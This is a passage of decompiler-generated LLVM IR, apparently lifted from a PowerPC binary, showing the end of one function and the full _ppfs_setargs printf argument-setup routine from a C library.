  %v0_10008ddc = phi i32 [ %v0_10008d8c, %entry ], [ %v0_10008ddc.pre, %dec_label_pc_10008db4 ]
  store i32 %v0_10008d84, i32* %r0.global-to-local, align 4
  ret i32 %v0_10008ddc

; uselistorder directives
  uselistorder i32 ()* @_ppfs_setargs, { 1, 0 }
  uselistorder label %dec_label_pc_10008dcc, { 1, 0 }
}

define i32 @_ppfs_setargs() local_unnamed_addr {
entry:
  %cr7_gt.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %v0_10008de0 = load i32, i32* @r3, align 4
  %v1_10008de0 = add i32 %v0_10008de0, 24
  %v2_10008de0 = inttoptr i32 %v1_10008de0 to i32*
  %v3_10008de0 = load i32, i32* %v2_10008de0, align 4
  store i32 %v3_10008de0, i32* %r0.global-to-local, align 4
  %v1_10008de4 = add i32 %v0_10008de0, 88
  store i32 %v1_10008de4, i32* @r8, align 4
  %v1_10008de8 = add i32 %v0_10008de0, 8
  %v2_10008de8 = inttoptr i32 %v1_10008de8 to i32*
  %v3_10008de8 = load i32, i32* %v2_10008de8, align 4
  store i32 %v3_10008de8, i32* %r9.global-to-local, align 4
  %v2_10008dec = icmp sgt i32 %v3_10008de0, 0
  %v3_10008dec = icmp eq i32 %v3_10008de0, 0
  store i1 %v2_10008dec, i1* %cr7_gt.global-to-local, align 1
  br i1 %v3_10008dec, label %dec_label_pc_10008df4, label %dec_label_pc_10008fe0

dec_label_pc_10008df4:                            ; preds = %entry
  store i32 -2147483648, i32* %r0.global-to-local, align 4
  %v3_10008df8 = icmp ne i32 %v3_10008de8, -2147483648
  %v4_10008df8 = icmp eq i32 %v3_10008de8, -2147483648
  store i1 %v3_10008df8, i1* %cr7_gt.global-to-local, align 1
  br i1 %v4_10008df8, label %dec_label_pc_10008e00, label %dec_label_pc_10008e40

dec_label_pc_10008e00:                            ; preds = %dec_label_pc_10008df4
  %v1_10008e00 = add i32 %v0_10008de0, 76
  %v2_10008e00 = inttoptr i32 %v1_10008e00 to i8*
  %v3_10008e00 = load i8, i8* %v2_10008e00, align 1
  %v4_10008e00 = zext i8 %v3_10008e00 to i32
  store i32 %v4_10008e00, i32* %r10.global-to-local, align 4
  store i32 %v1_10008e00, i32* %r11.global-to-local, align 4
  %v2_10008e08 = icmp ugt i8 %v3_10008e00, 8
  store i1 %v2_10008e08, i1* %cr7_gt.global-to-local, align 1
  %tmp = icmp ugt i8 %v3_10008e00, 7
  br i1 %tmp, label %dec_label_pc_10008e28, label %dec_label_pc_10008e10

dec_label_pc_10008e10:                            ; preds = %dec_label_pc_10008e00
  %v1_10008e10 = add i32 %v0_10008de0, 84
  %v2_10008e10 = inttoptr i32 %v1_10008e10 to i32*
  %v3_10008e10 = load i32, i32* %v2_10008e10, align 4
  %v1_10008e14 = mul nuw nsw i32 %v4_10008e00, 4
  %v2_10008e18 = add i32 %v3_10008e10, %v1_10008e14
  store i32 %v2_10008e18, i32* %r9.global-to-local, align 4
  %v1_10008e1c = add nuw nsw i32 %v4_10008e00, 1
  store i32 %v1_10008e1c, i32* %r0.global-to-local, align 4
  %v1_10008e20 = trunc i32 %v1_10008e1c to i8
  store i8 %v1_10008e20, i8* %v2_10008e00, align 1
  br label %dec_label_pc_10008e34

dec_label_pc_10008e28:                            ; preds = %dec_label_pc_10008e00
  %v1_10008e28 = add i32 %v0_10008de0, 80
  %v2_10008e28 = inttoptr i32 %v1_10008e28 to i32*
  %v3_10008e28 = load i32, i32* %v2_10008e28, align 4
  store i32 %v3_10008e28, i32* %r9.global-to-local, align 4
  %v1_10008e2c = add i32 %v3_10008e28, 4
  store i32 %v1_10008e2c, i32* %r0.global-to-local, align 4
  store i32 %v1_10008e2c, i32* %v2_10008e28, align 4
  br label %dec_label_pc_10008e34

dec_label_pc_10008e34:                            ; preds = %dec_label_pc_10008e10, %dec_label_pc_10008e28
  %v0_10008e34 = load i32, i32* %r9.global-to-local, align 4
  %v1_10008e34 = inttoptr i32 %v0_10008e34 to i32*
  %v2_10008e34 = load i32, i32* %v1_10008e34, align 4
  store i32 %v2_10008e34, i32* %r0.global-to-local, align 4
  %v1_10008e38 = load i32, i32* @r8, align 4
  %v2_10008e38 = inttoptr i32 %v1_10008e38 to i32*
  store i32 %v2_10008e34, i32* %v2_10008e38, align 4
  %v0_10008e3c = load i32, i32* %r0.global-to-local, align 4
  %v1_10008e3c = load i32, i32* @r3, align 4
  %v2_10008e3c = add i32 %v1_10008e3c, 8
  %v3_10008e3c = inttoptr i32 %v2_10008e3c to i32*
  store i32 %v0_10008e3c, i32* %v3_10008e3c, align 4
  %v0_10008e40.pre = load i32, i32* @r3, align 4
  br label %dec_label_pc_10008e40

dec_label_pc_10008e40:                            ; preds = %dec_label_pc_10008df4, %dec_label_pc_10008e34
  %v2_10008e70 = phi i32 [ %v0_10008de0, %dec_label_pc_10008df4 ], [ %v0_10008e40.pre, %dec_label_pc_10008e34 ]
  %v1_10008e40 = add i32 %v2_10008e70, 4
  %v2_10008e40 = inttoptr i32 %v1_10008e40 to i32*
  %v3_10008e40 = load i32, i32* %v2_10008e40, align 4
  store i32 %v3_10008e40, i32* %r0.global-to-local, align 4
  store i32 -2147483648, i32* %r9.global-to-local, align 4
  %v3_10008e48 = icmp ne i32 %v3_10008e40, -2147483648
  %v4_10008e48 = icmp eq i32 %v3_10008e40, -2147483648
  store i1 %v3_10008e48, i1* %cr7_gt.global-to-local, align 1
  br i1 %v4_10008e48, label %dec_label_pc_10008e50, label %dec_label_pc_10008fd0.preheader

dec_label_pc_10008e50:                            ; preds = %dec_label_pc_10008e40
  %v1_10008e50 = add i32 %v2_10008e70, 76
  %v2_10008e50 = inttoptr i32 %v1_10008e50 to i8*
  %v3_10008e50 = load i8, i8* %v2_10008e50, align 1
  %v4_10008e50 = zext i8 %v3_10008e50 to i32
  store i32 %v4_10008e50, i32* %r10.global-to-local, align 4
  store i32 %v1_10008e50, i32* %r11.global-to-local, align 4
  %v2_10008e58 = icmp ugt i8 %v3_10008e50, 8
  store i1 %v2_10008e58, i1* %cr7_gt.global-to-local, align 1
  %tmp22 = icmp ugt i8 %v3_10008e50, 7
  br i1 %tmp22, label %dec_label_pc_10008e78, label %dec_label_pc_10008e60

dec_label_pc_10008e60:                            ; preds = %dec_label_pc_10008e50
  %v1_10008e60 = add i32 %v2_10008e70, 84
  %v2_10008e60 = inttoptr i32 %v1_10008e60 to i32*
  %v3_10008e60 = load i32, i32* %v2_10008e60, align 4
  %v1_10008e64 = mul nuw nsw i32 %v4_10008e50, 4
  %v2_10008e68 = add i32 %v3_10008e60, %v1_10008e64
  store i32 %v2_10008e68, i32* %r9.global-to-local, align 4
  %v1_10008e6c = add nuw nsw i32 %v4_10008e50, 1
  store i32 %v1_10008e6c, i32* %r0.global-to-local, align 4
  %v1_10008e70 = trunc i32 %v1_10008e6c to i8
  store i8 %v1_10008e70, i8* %v2_10008e50, align 1
  br label %dec_label_pc_10008e84

dec_label_pc_10008e78:                            ; preds = %dec_label_pc_10008e50
  %v1_10008e78 = add i32 %v2_10008e70, 80
  %v2_10008e78 = inttoptr i32 %v1_10008e78 to i32*
  %v3_10008e78 = load i32, i32* %v2_10008e78, align 4
  store i32 %v3_10008e78, i32* %r9.global-to-local, align 4
  %v1_10008e7c = add i32 %v3_10008e78, 4
  store i32 %v1_10008e7c, i32* %r0.global-to-local, align 4
  store i32 %v1_10008e7c, i32* %v2_10008e78, align 4
  br label %dec_label_pc_10008e84

dec_label_pc_10008e84:                            ; preds = %dec_label_pc_10008e60, %dec_label_pc_10008e78
  %v0_10008e84 = load i32, i32* %r9.global-to-local, align 4
  %v1_10008e84 = inttoptr i32 %v0_10008e84 to i32*
  %v2_10008e84 = load i32, i32* %v1_10008e84, align 4
  store i32 %v2_10008e84, i32* %r0.global-to-local, align 4
  %v1_10008e88 = load i32, i32* @r8, align 4
  %v2_10008e88 = inttoptr i32 %v1_10008e88 to i32*
  store i32 %v2_10008e84, i32* %v2_10008e88, align 4
  %v0_10008e8c = load i32, i32* %r0.global-to-local, align 4
  %v1_10008e8c = load i32, i32* @r3, align 4
  %v2_10008e8c = add i32 %v1_10008e8c, 4
  %v3_10008e8c = inttoptr i32 %v2_10008e8c to i32*
  store i32 %v0_10008e8c, i32* %v3_10008e8c, align 4
  %v0_10008fd05.pre = load i32, i32* @r3, align 4
  br label %dec_label_pc_10008fd0.preheader

dec_label_pc_10008fd0.preheader:                  ; preds = %dec_label_pc_10008e40, %dec_label_pc_10008e84
  %v0_10008fd05 = phi i32 [ %v2_10008e70, %dec_label_pc_10008e40 ], [ %v0_10008fd05.pre, %dec_label_pc_10008e84 ]
  store i32 0, i32* @r7, align 4
  %v1_10008fd06 = add i32 %v0_10008fd05, 28
  %v2_10008fd07 = inttoptr i32 %v1_10008fd06 to i32*
  %v3_10008fd08 = load i32, i32* %v2_10008fd07, align 4
  store i32 %v3_10008fd08, i32* %r0.global-to-local, align 4
  %v2_10008fd49 = icmp sgt i32 %v3_10008fd08, 0
  %v3_10008fd410 = icmp slt i32 %v3_10008fd08, 0
  store i1 %v3_10008fd410, i1* %cr7_gt.global-to-local, align 1
  br i1 %v2_10008fd49, label %dec_label_pc_10008e98, label %dec_label_pc_10009020

dec_label_pc_10008e98:                            ; preds = %dec_label_pc_10008fd0.preheader, %dec_label_pc_10008fcc
  %v2_10008fac = phi i32 [ %v0_10008fd0, %dec_label_pc_10008fcc ], [ %v0_10008fd05, %dec_label_pc_10008fd0.preheader ]
  %v0_10008e98 = phi i32 [ %v1_10008fcc, %dec_label_pc_10008fcc ], [ 0, %dec_label_pc_10008fd0.preheader ]
  %v1_10008e98 = mul i32 %v0_10008e98, 4
  %v2_10008e9c = add i32 %v1_10008e98, %v2_10008fac
  store i32 %v2_10008e9c, i32* %r9.global-to-local, align 4
  %v1_10008ea0 = add i32 %v2_10008e9c, 40
  %v2_10008ea0 = inttoptr i32 %v1_10008ea0 to i32*
  %v3_10008ea0 = load i32, i32* %v2_10008ea0, align 4
  store i32 %v3_10008ea0, i32* %r0.global-to-local, align 4
  %v2_10008ea4 = icmp sgt i32 %v3_10008ea0, 8
  %v3_10008ea4 = icmp eq i32 %v3_10008ea0, 8
  store i1 %v2_10008ea4, i1* %cr7_gt.global-to-local, align 1
  br i1 %v3_10008ea4, label %dec_label_pc_10008fcc, label %dec_label_pc_10008eac

dec_label_pc_10008eac:                            ; preds = %dec_label_pc_10008e98
  %v1_10008eac = add i32 %v2_10008fac, 76
  store i32 %v1_10008eac, i32* %r10.global-to-local, align 4
  br i1 %v2_10008ea4, label %dec_label_pc_10008ec8, label %dec_label_pc_10008eb4

dec_label_pc_10008eb4:                            ; preds = %dec_label_pc_10008eac
  %v2_10008eb4 = icmp sgt i32 %v3_10008ea0, 2
  store i1 %v2_10008eb4, i1* %cr7_gt.global-to-local, align 1
  %tmp23 = icmp slt i32 %v3_10008ea0, 3
  br i1 %tmp23, label %dec_label_pc_10008f90, label %dec_label_pc_10008ee0

dec_label_pc_10008ec8:                            ; preds = %dec_label_pc_10008eac
  %v2_10008ec8 = icmp sgt i32 %v3_10008ea0, 1024
  store i1 %v2_10008ec8, i1* %cr7_gt.global-to-local, align 1
  %tmp24 = icmp slt i32 %v3_10008ea0, 1025
  br i1 %tmp24, label %dec_label_pc_10008f90, label %dec_label_pc_10008ed4

dec_label_pc_10008ed4:                            ; preds = %dec_label_pc_10008ec8
  %v2_10008ed4 = icmp sgt i32 %v3_10008ea0, 2048
  %v3_10008ed4 = icmp eq i32 %v3_10008ea0, 2048
  store i1 %v2_10008ed4, i1* %cr7_gt.global-to-local, align 1
  br i1 %v3_10008ed4, label %dec_label_pc_10008ee8, label %dec_label_pc_10008edc

dec_label_pc_10008edc:                            ; preds = %dec_label_pc_10008ed4
  %v2_10008edc = icmp sgt i32 %v3_10008ea0, 2055
  %v3_10008edc = icmp eq i32 %v3_10008ea0, 2055
  store i1 %v2_10008edc, i1* %cr7_gt.global-to-local, align 1
  br i1 %v3_10008edc, label %dec_label_pc_10008f44, label %dec_label_pc_10008f90

dec_label_pc_10008ee0:                            ; preds = %dec_label_pc_10008eb4
  %v3_10008ec0 = icmp eq i32 %v3_10008ea0, 7
  store i1 false, i1* %cr7_gt.global-to-local, align 1
  br i1 %v3_10008ec0, label %dec_label_pc_10008f44, label %dec_label_pc_10008f90

dec_label_pc_10008ee8:                            ; preds = %dec_label_pc_10008ed4
  %v2_10008ee8 = inttoptr i32 %v1_10008eac to i8*
  %v3_10008ee8 = load i8, i8* %v2_10008ee8, align 1
  %v4_10008ee8 = zext i8 %v3_10008ee8 to i32
  %v2_10008eec = icmp ugt i8 %v3_10008ee8, 6
  store i1 %v2_10008eec, i1* %cr7_gt.global-to-local, align 1
  %tmp28 = urem i8 %v3_10008ee8, 2
  %v1_10008ef0 = zext i8 %tmp28 to i32
  store i32 %v1_10008ef0, i32* %r9.global-to-local, align 4
  %v2_10008ef4 = add nuw nsw i32 %v1_10008ef0, %v4_10008ee8
  store i32 %v2_10008ef4, i32* %r0.global-to-local, align 4
  %v1_10008ef8 = trunc i32 %v2_10008ef4 to i8
  store i8 %v1_10008ef8, i8* %v2_10008ee8, align 1
  %v0_10008efc = load i1, i1* %cr7_gt.global-to-local, align 1
  br i1 %v0_10008efc, label %dec_label_pc_10008f1c, label %dec_label_pc_10008f00

dec_label_pc_10008f00:                            ; preds = %dec_label_pc_10008ee8
  %v0_10008f00 = load i32, i32* %r0.global-to-local, align 4
  %v1_10008f00 = urem i32 %v0_10008f00, 256
  store i32 %v1_10008f00, i32* %r9.global-to-local, align 4
  %v0_10008f04 = load i32, i32* %r10.global-to-local, align 4
  %v1_10008f04 = add i32 %v0_10008f04, 8
  %v2_10008f04 = inttoptr i32 %v1_10008f04 to i32*
  %v3_10008f04 = load i32, i32* %v2_10008f04, align 4
  %v1_10008f08 = mul nuw nsw i32 %v1_10008f00, 4
  store i32 %v1_10008f08, i32* %r0.global-to-local, align 4
  %v1_10008f0c = add nuw nsw i32 %v1_10008f00, 2
  store i32 %v1_10008f0c, i32* %r9.global-to-local, align 4
  %v2_10008f10 = add i32 %v3_10008f04, %v1_10008f08
  store i32 %v2_10008f10, i32* %r11.global-to-local, align 4
  %v1_10008f14 = trunc i32 %v1_10008f0c to i8
  %v2_10008f14 = load i32, i32* @r3, align 4
  %v3_10008f14 = add i32 %v2_10008f14, 76
  %v4_10008f14 = inttoptr i32 %v3_10008f14 to i8*
  store i8 %v1_10008f14, i8* %v4_10008f14, align 1
  br label %dec_label_pc_10008f30

dec_label_pc_10008f1c:                            ; preds = %dec_label_pc_10008ee8
  %v0_10008f1c = load i32, i32* %r10.global-to-local, align 4
  %v1_10008f1c = add i32 %v0_10008f1c, 4
  %v2_10008f1c = inttoptr i32 %v1_10008f1c to i32*
  %v3_10008f1c = load i32, i32* %v2_10008f1c, align 4
  %v1_10008f20 = add i32 %v3_10008f1c, 7
  store i32 %v1_10008f20, i32* %r9.global-to-local, align 4
  %v1_10008f24 = call i32 @__asm_rlwinm(i32 %v1_10008f20, i32 0, i32 0, i32 28)
  store i32 %v1_10008f24, i32* %r11.global-to-local, align 4
  %v1_10008f28 = add i32 %v1_10008f24, 8
  store i32 %v1_10008f28, i32* %r0.global-to-local, align 4
  %v1_10008f2c = load i32, i32* %r10.global-to-local, align 4
  %v2_10008f2c = add i32 %v1_10008f2c, 4
  %v3_10008f2c = inttoptr i32 %v2_10008f2c to i32*
  store i32 %v1_10008f28, i32* %v3_10008f2c, align 4
  br label %dec_label_pc_10008f30

dec_label_pc_10008f30:                            ; preds = %dec_label_pc_10008f00, %dec_label_pc_10008f1c
  %v0_10008f30 = load i32, i32* %r11.global-to-local, align 4
  %v1_10008f30 = inttoptr i32 %v0_10008f30 to i32*
  %v2_10008f30 = load i32, i32* %v1_10008f30, align 4
  store i32 %v2_10008f30, i32* %r9.global-to-local, align 4
  %v1_10008f34 = add i32 %v0_10008f30, 4
  %v2_10008f34 = inttoptr i32 %v1_10008f34 to i32*
  %v3_10008f34 = load i32, i32* %v2_10008f34, align 4
  store i32 %v3_10008f34, i32* %r10.global-to-local, align 4
  %v1_10008f38 = load i32, i32* @r8, align 4
  %v2_10008f38 = inttoptr i32 %v1_10008f38 to i32*
  store i32 %v2_10008f30, i32* %v2_10008f38, align 4
  %v0_10008f3c = load i32, i32* %r10.global-to-local, align 4
  %v1_10008f3c = load i32, i32* @r8, align 4
  %v2_10008f3c = add i32 %v1_10008f3c, 4
  %v3_10008f3c = inttoptr i32 %v2_10008f3c to i32*
  store i32 %v0_10008f3c, i32* %v3_10008f3c, align 4
  br label %dec_label_pc_10008fc8

dec_label_pc_10008f44:                            ; preds = %dec_label_pc_10008edc, %dec_label_pc_10008ee0
  store i32 %v1_10008eac, i32* %r10.global-to-local, align 4
  %v1_10008f48 = add i32 %v2_10008fac, 77
  %v2_10008f48 = inttoptr i32 %v1_10008f48 to i8*
  %v3_10008f48 = load i8, i8* %v2_10008f48, align 1
  %v4_10008f48 = zext i8 %v3_10008f48 to i32
  store i32 %v4_10008f48, i32* %r11.global-to-local, align 4
  %v2_10008f4c = icmp ugt i8 %v3_10008f48, 8
  store i1 %v2_10008f4c, i1* %cr7_gt.global-to-local, align 1
  %tmp25 = icmp ugt i8 %v3_10008f48, 7
  br i1 %tmp25, label %dec_label_pc_10008f70, label %dec_label_pc_10008f54

dec_label_pc_10008f54:                            ; preds = %dec_label_pc_10008f44
  %v1_10008f54 = add i32 %v2_10008fac, 84
  %v2_10008f54 = inttoptr i32 %v1_10008f54 to i32*
  %v3_10008f54 = load i32, i32* %v2_10008f54, align 4
  %v1_10008f58 = mul nuw nsw i32 %v4_10008f48, 8
  %v1_10008f5c = add nuw nsw i32 %v1_10008f58, 32
  %v2_10008f60 = add i32 %v1_10008f5c, %v3_10008f54
  store i32 %v2_10008f60, i32* %r9.global-to-local, align 4
  %v1_10008f64 = add nuw nsw i32 %v4_10008f48, 1
  store i32 %v1_10008f64, i32* %r0.global-to-local, align 4
  %v1_10008f68 = trunc i32 %v1_10008f64 to i8
  store i8 %v1_10008f68, i8* %v2_10008f48, align 1
  br label %dec_label_pc_10008fc8

dec_label_pc_10008f70:                            ; preds = %dec_label_pc_10008f44
  %v1_10008f70 = add i32 %v2_10008fac, 80
  %v2_10008f70 = inttoptr i32 %v1_10008f70 to i32*
  %v3_10008f70 = load i32, i32* %v2_10008f70, align 4
  %v1_10008f74 = add i32 %v3_10008f70, 7
  store i32 %v1_10008f74, i32* %r9.global-to-local, align 4
  %v1_10008f78 = call i32 @__asm_rlwinm(i32 %v1_10008f74, i32 0, i32 0, i32 28)
  store i32 %v1_10008f78, i32* %r9.global-to-local, align 4
  %v1_10008f7c = add i32 %v1_10008f78, 8
  store i32 %v1_10008f7c, i32* %r0.global-to-local, align 4
  %v1_10008f80 = load i32, i32* %r10.global-to-local, align 4
  %v2_10008f80 = add i32 %v1_10008f80, 4
  %v3_10008f80 = inttoptr i32 %v2_10008f80 to i32*
  store i32 %v1_10008f7c, i32* %v3_10008f80, align 4
  br label %dec_label_pc_10008fc8

dec_label_pc_10008f90:                            ; preds = %dec_label_pc_10008edc, %dec_label_pc_10008ee0, %dec_label_pc_10008ec8, %dec_label_pc_10008eb4
  %v2_10008f90 = inttoptr i32 %v1_10008eac to i8*
  %v3_10008f90 = load i8, i8* %v2_10008f90, align 1
  %v4_10008f90 = zext i8 %v3_10008f90 to i32
  store i32 %v4_10008f90, i32* %r11.global-to-local, align 4
  %v2_10008f94 = icmp ugt i8 %v3_10008f90, 8
  store i1 %v2_10008f94, i1* %cr7_gt.global-to-local, align 1
  %tmp26 = icmp ugt i8 %v3_10008f90, 7
  br i1 %tmp26, label %dec_label_pc_10008fb4, label %dec_label_pc_10008f9c

dec_label_pc_10008f9c:                            ; preds = %dec_label_pc_10008f90
  %v1_10008f9c = add i32 %v2_10008fac, 84
  %v2_10008f9c = inttoptr i32 %v1_10008f9c to i32*
  %v3_10008f9c = load i32, i32* %v2_10008f9c, align 4
  %v1_10008fa0 = mul nuw nsw i32 %v4_10008f90, 4
  %v2_10008fa4 = add i32 %v3_10008f9c, %v1_10008fa0
  store i32 %v2_10008fa4, i32* %r9.global-to-local, align 4
  %v1_10008fa8 = add nuw nsw i32 %v4_10008f90, 1
  store i32 %v1_10008fa8, i32* %r0.global-to-local, align 4
  %v1_10008fac = trunc i32 %v1_10008fa8 to i8
  store i8 %v1_10008fac, i8* %v2_10008f90, align 1
  br label %dec_label_pc_10008fc0

dec_label_pc_10008fb4:                            ; preds = %dec_label_pc_10008f90
  %v1_10008fb4 = add i32 %v2_10008fac, 80
  %v2_10008fb4 = inttoptr i32 %v1_10008fb4 to i32*
  %v3_10008fb4 = load i32, i32* %v2_10008fb4, align 4
  store i32 %v3_10008fb4, i32* %r9.global-to-local, align 4
  %v1_10008fb8 = add i32 %v3_10008fb4, 4
  store i32 %v1_10008fb8, i32* %r0.global-to-local, align 4
  store i32 %v1_10008fb8, i32* %v2_10008fb4, align 4
  br label %dec_label_pc_10008fc0

dec_label_pc_10008fc0:                            ; preds = %dec_label_pc_10008f9c, %dec_label_pc_10008fb4
  %v0_10008fc0 = load i32, i32* %r9.global-to-local, align 4
  %v1_10008fc0 = inttoptr i32 %v0_10008fc0 to i32*
  %v2_10008fc0 = load i32, i32* %v1_10008fc0, align 4
  store i32 %v2_10008fc0, i32* %r0.global-to-local, align 4
  %v1_10008fc4 = load i32, i32* @r8, align 4
  %v2_10008fc4 = inttoptr i32 %v1_10008fc4 to i32*
  store i32 %v2_10008fc0, i32* %v2_10008fc4, align 4
  br label %dec_label_pc_10008fc8

dec_label_pc_10008fc8:                            ; preds = %dec_label_pc_10008f70, %dec_label_pc_10008f54, %dec_label_pc_10008f30, %dec_label_pc_10008fc0
  %v0_10008fc8 = load i32, i32* @r8, align 4
  %v1_10008fc8 = add i32 %v0_10008fc8, 8
  store i32 %v1_10008fc8, i32* @r8, align 4
  %v0_10008fcc.pre = load i32, i32* @r7, align 4
  %v0_10008fd0.pre = load i32, i32* @r3, align 4
  br label %dec_label_pc_10008fcc

dec_label_pc_10008fcc:                            ; preds = %dec_label_pc_10008e98, %dec_label_pc_10008fc8
  %v0_10008fd0 = phi i32 [ %v2_10008fac, %dec_label_pc_10008e98 ], [ %v0_10008fd0.pre, %dec_label_pc_10008fc8 ]
  %v0_10008fcc = phi i32 [ %v0_10008e98, %dec_label_pc_10008e98 ], [ %v0_10008fcc.pre, %dec_label_pc_10008fc8 ]
  %v1_10008fcc = add i32 %v0_10008fcc, 1
  store i32 %v1_10008fcc, i32* @r7, align 4
  %v1_10008fd0 = add i32 %v0_10008fd0, 28
  %v2_10008fd0 = inttoptr i32 %v1_10008fd0 to i32*
  %v3_10008fd0 = load i32, i32* %v2_10008fd0, align 4
  store i32 %v3_10008fd0, i32* %r0.global-to-local, align 4
  %v2_10008fd4 = icmp slt i32 %v1_10008fcc, %v3_10008fd0
  %v3_10008fd4 = icmp sgt i32 %v1_10008fcc, %v3_10008fd0
  store i1 %v3_10008fd4, i1* %cr7_gt.global-to-local, align 1
  br i1 %v2_10008fd4, label %dec_label_pc_10008e98, label %dec_label_pc_10009020

dec_label_pc_10008fe0:                            ; preds = %entry
  store i32 -2147483648, i32* %r11.global-to-local, align 4
  %v3_10008fe4 = icmp ne i32 %v3_10008de8, -2147483648
  %v4_10008fe4 = icmp eq i32 %v3_10008de8, -2147483648
  store i1 %v3_10008fe4, i1* %cr7_gt.global-to-local, align 1
  br i1 %v4_10008fe4, label %dec_label_pc_10008fec, label %dec_label_pc_10009000

dec_label_pc_10008fec:                            ; preds = %dec_label_pc_10008fe0
  %v1_10008fec = add i32 %v0_10008de0, 36
  %v2_10008fec = inttoptr i32 %v1_10008fec to i8*
  %v3_10008fec = load i8, i8* %v2_10008fec, align 1
  %v4_10008fec = zext i8 %v3_10008fec to i32
  %v1_10008ff0 = mul nuw nsw i32 %v4_10008fec, 8
  %v2_10008ff4 = add i32 %v1_10008ff0, %v1_10008de4
  store i32 %v2_10008ff4, i32* %r9.global-to-local, align 4
  %v1_10008ff8 = add i32 %v2_10008ff4, -8
  %v2_10008ff8 = inttoptr i32 %v1_10008ff8 to i32*
  %v3_10008ff8 = load i32, i32* %v2_10008ff8, align 4
  store i32 %v3_10008ff8, i32* %r0.global-to-local, align 4
  store i32 %v3_10008ff8, i32* %v2_10008de8, align 4
  %v0_10009000.pre = load i32, i32* @r3, align 4
  %v1_10009004.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10009000

dec_label_pc_10009000:                            ; preds = %dec_label_pc_10008fe0, %dec_label_pc_10008fec
  %v1_10009004 = phi i32 [ -2147483648, %dec_label_pc_10008fe0 ], [ %v1_10009004.pre, %dec_label_pc_10008fec ]
  %v1_1000901c = phi i32 [ %v0_10008de0, %dec_label_pc_10008fe0 ], [ %v0_10009000.pre, %dec_label_pc_10008fec ]
  %v1_10009000 = add i32 %v1_1000901c, 4
  %v2_10009000 = inttoptr i32 %v1_10009000 to i32*
  %v3_10009000 = load i32, i32* %v2_10009000, align 4
  store i32 %v3_10009000, i32* %r0.global-to-local, align 4
  %v3_10009004 = icmp sgt i32 %v3_10009000, %v1_10009004
  %v4_10009004 = icmp eq i32 %v3_10009000, %v1_10009004
  store i1 %v3_10009004, i1* %cr7_gt.global-to-local, align 1
  br i1 %v4_10009004, label %dec_label_pc_1000900c, label %dec_label_pc_10009020

dec_label_pc_1000900c:                            ; preds = %dec_label_pc_10009000
  %v1_1000900c = add i32 %v1_1000901c, 37
  %v2_1000900c = inttoptr i32 %v1_1000900c to i8*
  %v3_1000900c = load i8, i8* %v2_1000900c, align 1
  %v4_1000900c = zext i8 %v3_1000900c to i32
  %v1_10009010 = mul nuw nsw i32 %v4_1000900c, 8
  %v1_10009014 = load i32, i32* @r8, align 4
  %v2_10009014 = add i32 %v1_10009010, %v1_10009014
  store i32 %v2_10009014, i32* %r9.global-to-local, align 4
  %v1_10009018 = add i32 %v2_10009014, -8
  %v2_10009018 = inttoptr i32 %v1_10009018 to i32*
  %v3_10009018 = load i32, i32* %v2_10009018, align 4
  store i32 %v3_10009018, i32* %r0.global-to-local, align 4
  store i32 %v3_10009018, i32* %v2_10009000, align 4
  %v0_10009020.pre = load i32, i32* @r3, align 4
  br label %dec_label_pc_10009020

dec_label_pc_10009020:                            ; preds = %dec_label_pc_10008fcc, %dec_label_pc_10008fd0.preheader, %dec_label_pc_10009000, %dec_label_pc_1000900c
  %v0_10009020 = phi i32 [ %v1_1000901c, %dec_label_pc_10009000 ], [ %v0_10009020.pre, %dec_label_pc_1000900c ], [ %v0_10008fd05, %dec_label_pc_10008fd0.preheader ], [ %v0_10008fd0, %dec_label_pc_10008fcc ]
  %v1_10009020 = add i32 %v0_10009020, 8
  %v2_10009020 = inttoptr i32 %v1_10009020 to i32*
  %v3_10009020 = load i32, i32* %v2_10009020, align 4
  store i32 %v3_10009020, i32* %r11.global-to-local, align 4
  %v2_10009024 = icmp sgt i32 %v3_10009020, 0
  store i1 %v2_10009024, i1* %cr7_gt.global-to-local, align 1
  %v0_10009028 = load i32, i32* @lr, align 4
  %tmp27 = icmp sgt i32 %v3_10009020, -1
  call void @__pseudo_cond_branch(i1 %tmp27, i32 %v0_10009028)
  %v0_1000902c = load i32, i32* @r3, align 4
  %v1_1000902c = add i32 %v0_1000902c, 16
  %v2_1000902c = inttoptr i32 %v1_1000902c to i32*
  %v3_1000902c = load i32, i32* %v2_1000902c, align 4
  store i32 %v3_1000902c, i32* %r0.global-to-local, align 4
  %v0_10009030 = load i32, i32* %r11.global-to-local, align 4
  %v1_10009030 = sub i32 0, %v0_10009030
  store i32 %v1_10009030, i32* %r11.global-to-local, align 4
  store i32 32, i32* %r9.global-to-local, align 4
  %v2_10009038 = add i32 %v0_1000902c, 8
  %v3_10009038 = inttoptr i32 %v2_10009038 to i32*
  store i32 %v1_10009030, i32* %v3_10009038, align 4
  %v0_1000903c = load i32, i32* %r0.global-to-local, align 4
  %v1_1000903c = or i32 %v0_1000903c, 8
  store i32 %v1_1000903c, i32* %r0.global-to-local, align 4
  %v0_10009040 = load i32, i32* %r9.global-to-local, align 4
  %v1_10009040 = load i32, i32* @r3, align 4
  %v2_10009040 = add i32 %v1_10009040, 20
  %v3_10009040 = inttoptr i32 %v2_10009040 to i32*
  store i32 %v0_10009040, i32* %v3_10009040, align 4
  %v1_10009044 = call i32 @__asm_rlwinm(i32 %v1_1000903c, i32 0, i32 0, i32 30)
  store i32 %v1_10009044, i32* %r0.global-to-local, align 4
  %v1_10009048 = load i32, i32* @r3, align 4
  %v2_10009048 = add i32 %v1_10009048, 16
  %v3_10009048 = inttoptr i32 %v2_10009048 to i32*
  store i32 %v1_10009044, i32* %v3_10009048, align 4
  %v0_1000904c = load i32, i32* @r3, align 4
  ret i32 %v0_1000904c

; uselistorder directives
  uselistorder i32 %v3_10009000, { 1, 0, 2 }
  uselistorder i32 %v1_10009004, { 1, 0 }
  uselistorder i32 %v3_10008fd0, { 1, 0, 2 }
  uselistorder i32 %v1_10008fcc, { 2, 3, 1, 0 }
  uselistorder i32 %v0_10008fd0, { 0, 2, 1 }
  uselistorder i32 %v4_10008f48, { 1, 0, 2 }
  uselistorder i32 %v1_10008f08, { 1, 0 }
  uselistorder i32 %v1_10008f00, { 2, 0, 1 }
  uselistorder i32 %v1_10008eac, { 0, 2, 1, 3 }
  uselistorder i32 %v3_10008ea0, { 4, 1, 0, 3, 2, 8, 5, 7, 6, 10, 9, 11 }
  uselistorder i32 %v0_10008e98, { 1, 0 }
